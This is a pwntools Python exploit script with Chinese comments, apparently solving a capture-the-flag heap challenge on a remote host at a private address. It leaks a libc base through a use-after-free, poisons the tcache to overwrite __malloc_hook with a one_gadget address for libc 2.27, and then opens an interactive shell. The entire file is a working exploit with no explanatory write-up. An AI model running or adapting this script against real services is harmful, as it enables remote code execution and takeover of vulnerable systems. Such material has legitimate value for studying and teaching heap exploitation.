from pwn import *

# 目标程序的地址信息
host = '10.12.153.73'
port = 11636
p = remote(host, port)

# 加载目标程序的 libc 信息
libc = ELF('./libc-2.27.so')

# 定义堆操作函数
def add(i, size):
    p.sendlineafter(b"Your choice >> ", b'1')
    p.sendlineafter(b"index: ", str(i).encode())
    p.sendlineafter(b"size: ", str(size).encode())

def free(i):
    p.sendlineafter(b"Your choice >> ", b'2')
    p.sendlineafter(b"index: ", str(i).encode())

def show(i):
    p.sendlineafter(b"Your choice >> ", b'3')
    p.sendlineafter(b"index: ", str(i).encode())

def edit(i, content):
    p.sendlineafter(b"Your choice >> ", b'4')
    p.sendlineafter(b"index: ", str(i).encode())
    p.sendlineafter(b"content: ", content)

# 泄露 libc 基地址
add(0, 0x410)          # 分配大堆块
add(1, 0x20)           # 分配小堆块
free(0)                # 释放大堆块进入 unsorted bin
show(0)                # 泄露 main_arena 地址
main_arena = u64(p.recv()[9:-1].ljust(8, b'\x00')) - 96
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
shell = libc_base + 0x10A2FC  # 偏移为 one_gadget

# 覆盖 __malloc_hook
free(1)                # 释放小堆块进入 tcache
edit(1, p64(malloc_hook))  # 修改 fd 指针指向 __malloc_hook
add(2, 0x20)           # 申请堆块，取出伪造的 tcache
add(3, 0x20)           # 再次申请，覆盖 __malloc_hook
edit(3, p64(shell))    # 将 __malloc_hook 指向伪造的 shell 地址

# 触发 malloc，执行目标指令
add(4, 0x10)           # 触发 malloc
p.interactive()
